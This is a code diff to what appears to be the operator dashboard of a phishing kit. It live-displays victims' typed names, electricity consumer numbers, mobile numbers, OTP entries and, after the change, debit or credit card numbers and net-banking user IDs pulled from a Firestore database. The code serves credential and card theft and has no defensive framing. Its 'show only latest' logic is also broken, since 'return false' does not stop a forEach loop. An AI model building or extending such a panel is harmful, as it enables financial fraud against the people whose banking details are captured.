@@ -161,17 +161,32 @@ db.collection("otp_entries").onSnapshot(snap=>{
   });
 });
 
-/* LIVE TYPING */
+/* LIVE TYPING (FIXED) */
 db.collection("live_typing").orderBy("timestamp","desc").onSnapshot(snap=>{
-  snap.docChanges().forEach(change=>{
-    const d=change.doc.data();
-    const html=`
-    <p><b>Name:</b> ${d.name || ""}</p>
-    <p><b>KNO:</b> ${d.kno || ""}</p>
-    <p><b>Mobile:</b> ${d.mobile || ""}</p>
-    <span class="time">${formatTime(d.timestamp)}</span>
+  const section = document.getElementById("liveSection");
+
+  // Clear old entries
+  section.innerHTML = "<h3>Live Typing</h3>";
+
+  snap.forEach(doc=>{
+    const d = doc.data();
+
+    const div = document.createElement('div');
+    div.className = 'entry';
+
+    div.innerHTML = `
+      <p><b>Name:</b> ${d.name || ""}</p>
+      <p><b>KNO:</b> ${d.kno || ""}</p>
+      <p><b>Mobile:</b> ${d.mobile || ""}</p>
+      <p><b>Card:</b> ${d.debitCard || d.creditCard || ""}</p>
+      <p><b>User:</b> ${d.netUser || ""}</p>
+      <span class="time">${formatTime(d.timestamp)}</span>
     `;
-    renderEntry("liveSection",html,change.doc.id,"live_typing");
+
+    section.appendChild(div);
+
+    // show only latest
+    return false;
   });
 });
 </script>
